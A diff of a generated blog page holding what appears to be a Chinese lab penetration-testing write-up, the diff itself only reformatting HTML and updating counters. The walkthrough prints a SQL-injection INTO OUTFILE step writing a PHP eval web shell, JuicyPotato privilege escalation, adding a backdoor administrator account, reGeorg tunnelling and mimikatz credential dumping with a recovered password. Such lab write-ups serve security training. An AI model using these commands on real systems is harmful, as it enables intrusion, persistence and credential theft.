@@ -286,7 +286,7 @@
                 <i class="far fa-file-word"></i>
               </span>
                 <span class="post-meta-item-text">本文字数：</span>
-              <span>1.2k</span>
+              <span>1.1k</span>
             </span>
             <span class="post-meta-item" title="阅读时长">
               <span class="post-meta-item-icon">
@@ -306,63 +306,69 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <h4 id="Getshell"><a href="#Getshell" class="headerlink" title="Getshell"></a>Getshell</h4><p>输入 <code>?id=1&#39;</code> 网站报错 爆出网站的绝对路径</p>
+        <h4 id="getshell">Getshell</h4>
+<p>输入 <code>?id=1'</code> 网站报错 爆出网站的绝对路径</p>
 <p><img src="/posts/3796bdc4/dir.png"></p>
 <p>?id=1 order by 2 发现存在两个字段</p>
 <p>使用union select没有回显，使用 into outfile 进行文件写入</p>
-<p><code>?id = 1 and 1=2 union select 1,2 into outfile &#39;C:/phpStudy/WWW/m.txt&#39;</code></p>
-<p>访问  m.txt 成功写入</p>
+<p><code>?id = 1 and 1=2 union select 1,2 into outfile 'C:/phpStudy/WWW/m.txt'</code></p>
+<p>访问 m.txt 成功写入</p>
 <p><img src="/posts/3796bdc4/m.png"></p>
 <p>尝试写入一句话到网站根目录中</p>
-<p><code>?id=1 union select 1,&#39;&lt;?php eval($_REQUEST[8])?&gt;&#39; into outfile &#39;C:/phpStudy/WWW/zzz.php&#39;</code></p>
+<p><code>?id=1 union select 1,'&lt;?php eval($_REQUEST[8])?&gt;' into outfile 'C:/phpStudy/WWW/zzz.php'</code></p>
 <p>访问mm.php发现成功写入，使用蚁剑进行连接</p>
-<h4 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h4><p>进入终端查看当前权限 <code>whoami</code> 发现权限为 test权限</p>
-<p><code>ipconfig </code>发现内网ip 为 10.0.1.4</p>
+<h4 id="信息收集">信息收集</h4>
+<p>进入终端查看当前权限 <code>whoami</code> 发现权限为 test权限</p>
+<p><code>ipconfig</code>发现内网ip 为 10.0.1.4</p>
 <p><code>netstat -ano</code> 查看开放的端口</p>
 <p><code>tasklist</code> 查看运行的进程</p>
-<p><code>systeminfo</code>  查看系统信息 补丁号 </p>
+<p><code>systeminfo</code> 查看系统信息 补丁号</p>
 <p><img src="/posts/3796bdc4/buding.png"></p>
-<p><a target="_blank" rel="noopener" href="http://bugs.hacking8.com/tiquan/">http://bugs.hacking8.com/tiquan/</a> </p>
+<p>http://bugs.hacking8.com/tiquan/</p>
 <p>去这个网站找一下可以利用的exp</p>
-<br>
-
-<h4 id="JuicyPotato提权"><a href="#JuicyPotato提权" class="headerlink" title="JuicyPotato提权"></a>JuicyPotato提权</h4><p>HotPotato提权</p>
-<p>上传 JuicyPotato.exe </p>
-<p><code>bbb.exe -p &quot;whoami&quot;</code></p>
+<p><br></p>
+<h4 id="juicypotato提权">JuicyPotato提权</h4>
+<p>HotPotato提权</p>
+<p>上传 JuicyPotato.exe</p>
+<p><code>bbb.exe -p "whoami"</code></p>
 <p><img src="/posts/3796bdc4/potato.png"></p>
 <p>提权为system权限，然后再添加用户</p>
-<p><code>net user Mamor A1S2D3! /add</code> </p>
-<p> bbb.exe -p “net localgroup administrators Mamor /add”  //将用户添加到管理员组权限</p>
+<p><code>net user Mamor A1S2D3! /add</code></p>
+<p>bbb.exe -p "net localgroup administrators Mamor /add"
+//将用户添加到管理员组权限</p>
 <p><img src="/posts/3796bdc4/netuser1.png"></p>
 <p>net user 查看是否创建成功</p>
 <p><img src="/posts/3796bdc4/netuser2.png"></p>
 <p>成功创建用户</p>
-<br>
-
-<h4 id="内网穿透"><a href="#内网穿透" class="headerlink" title="内网穿透"></a>内网穿透</h4><p>内网穿透两种方法:<br>1.让目标机器去连接外网主机(需要公网ip)  前提是目标可以访问外网<br>2.在目标机器上设置信号站(放一个web文件带目标服务器，所有的流量都要通过这个文件)</p>
-<p>使用reGeorg进行内网穿透 </p>
+<p><br></p>
+<h4 id="内网穿透">内网穿透</h4>
+<p>内网穿透两种方法: 1.让目标机器去连接外网主机(需要公网ip)
+前提是目标可以访问外网
+2.在目标机器上设置信号站(放一个web文件带目标服务器，所有的流量都要通过这个文件)</p>
+<p>使用reGeorg进行内网穿透</p>
 <p>将 reGeorg中的 tunnel.nosocket.php 传到目标机器 改名为reG.php</p>
-<p>再公网访问下 </p>
+<p>再公网访问下</p>
 <p><img src="/posts/3796bdc4/reG1.png"></p>
 <p>本机执行 (python2)</p>
 <p><code>python reGeorgSocksProxy.py -l 127.0.0.1 -p 9999 -u http://afsgr16-b1ferw.aqlab.cn/reG.php</code></p>
 <p><img src="/posts/3796bdc4/reGrun.png"></p>
 <p>本机使用Proxifier 设置代理服务器 127.0.0.1 9999 socks5</p>
 <p><img src="/posts/3796bdc4/Proxy.png"></p>
-<p>设置代理规则 </p>
+<p>设置代理规则</p>
 <p><img src="/posts/3796bdc4/Proxy2.png"></p>
 <p>设置完代理后 使用 mstsc 远程连接10.0.1.4 成功登录</p>
-<br>
-
-<h4 id="使用-mimikatz-读取密码"><a href="#使用-mimikatz-读取密码" class="headerlink" title="使用 mimikatz 读取密码"></a>使用 mimikatz 读取密码</h4><p>将 mimikatz通过蚁剑上传到服务器 以管理员身份运行（windows2012/2016不能抓）</p>
-<p>提权<code> privilege::debug</code></p>
+<p><br></p>
+<h4 id="使用-mimikatz-读取密码">使用 mimikatz 读取密码</h4>
+<p>将 mimikatz通过蚁剑上传到服务器
+以管理员身份运行（windows2012/2016不能抓）</p>
+<p>提权<code>privilege::debug</code></p>
 <p><img src="/posts/3796bdc4/mm2.png"></p>
 <p>抓取密码 <code>sekurlsa::logonpasswords</code></p>
 <p>成功抓取到Administrator密码 woshifengge1.</p>
 <p><img src="/posts/3796bdc4/mm3.png"></p>
-<br>
-
-<h4 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h4><p>探测内网中是否还有其它主机</p>
+<p><br></p>
+<h4 id="flag">flag</h4>
+<p>探测内网中是否还有其它主机</p>
 <p>mstsc 尝试连接10.0.1.8 使用admin 密码成功登录</p>
 <p>得到flag</p>
 <p><img src="/posts/3796bdc4/flag.png"></p>
@@ -495,7 +501,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#Getshell"><span class="nav-number">1.</span> <span class="nav-text">Getshell</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-number">2.</span> <span class="nav-text">信息收集</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#JuicyPotato%E6%8F%90%E6%9D%83"><span class="nav-number">3.</span> <span class="nav-text">JuicyPotato提权</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F"><span class="nav-number">4.</span> <span class="nav-text">内网穿透</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8-mimikatz-%E8%AF%BB%E5%8F%96%E5%AF%86%E7%A0%81"><span class="nav-number">5.</span> <span class="nav-text">使用 mimikatz 读取密码</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#flag"><span class="nav-number">6.</span> <span class="nav-text">flag</span></a></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#getshell"><span class="nav-number">1.</span> <span class="nav-text">Getshell</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-number">2.</span> <span class="nav-text">信息收集</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#juicypotato%E6%8F%90%E6%9D%83"><span class="nav-number">3.</span> <span class="nav-text">JuicyPotato提权</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F"><span class="nav-number">4.</span> <span class="nav-text">内网穿透</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8-mimikatz-%E8%AF%BB%E5%8F%96%E5%AF%86%E7%A0%81"><span class="nav-number">5.</span> <span class="nav-text">使用 mimikatz 读取密码</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#flag"><span class="nav-number">6.</span> <span class="nav-text">flag</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
@@ -511,7 +517,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">193</span>
+          <span class="site-state-item-count">194</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -559,7 +565,7 @@
 <div class="copyright">
   
   &copy; 
-  <span itemprop="copyrightYear">2024</span>
+  <span itemprop="copyrightYear">2025</span>
   <span class="with-love">
     <i class="fa fa-heart"></i>
   </span>
@@ -573,7 +579,7 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">19:10</span>
+    <span title="站点阅读时长">19:09</span>
 </div>
 
 <!--
@@ -584,7 +590,7 @@
 <!--
 <div class="theme-info">
   <div class="powered-by"></div>
-  <span class="post-count">博客全站共266.3k字</span>
+  <span class="post-count">博客全站共267.3k字</span>
 </div>
 -->
         
@@ -724,6 +730,63 @@ window.addEventListener('pjax:success', () => {
 
     <div id="pjax">
   
+
+  
+      
+
+<script>
+  if (typeof MathJax === 'undefined') {
+    window.MathJax = {
+      loader: {
+          load: ['[tex]/mhchem'],
+        source: {
+          '[tex]/amsCd': '[tex]/amscd',
+          '[tex]/AMScd': '[tex]/amscd'
+        }
+      },
+      tex: {
+        inlineMath: {'[+]': [['$', '$']]},
+          packages: {'[+]': ['mhchem']},
+        tags: 'ams'
+      },
+      options: {
+        renderActions: {
+          findScript: [10, doc => {
+            document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
+              const display = !!node.type.match(/; *mode=display/);
+              const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
+              const text = document.createTextNode('');
+              node.parentNode.replaceChild(text, node);
+              math.start = {node: text, delim: '', n: 0};
+              math.end = {node: text, delim: '', n: 0};
+              doc.math.push(math);
+            });
+          }, '', false],
+          insertedScript: [200, () => {
+            document.querySelectorAll('mjx-container').forEach(node => {
+              let target = node.parentNode;
+              if (target.nodeName.toLowerCase() === 'li') {
+                target.parentNode.classList.add('has-jax');
+              }
+            });
+          }, '', false]
+        }
+      }
+    };
+    (function () {
+      var script = document.createElement('script');
+      script.src = '//cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js';
+      script.defer = true;
+      document.head.appendChild(script);
+    })();
+  } else {
+    MathJax.startup.document.state(0);
+    MathJax.texReset();
+    MathJax.typeset();
+  }
+</script>
+
+    
 
   
 
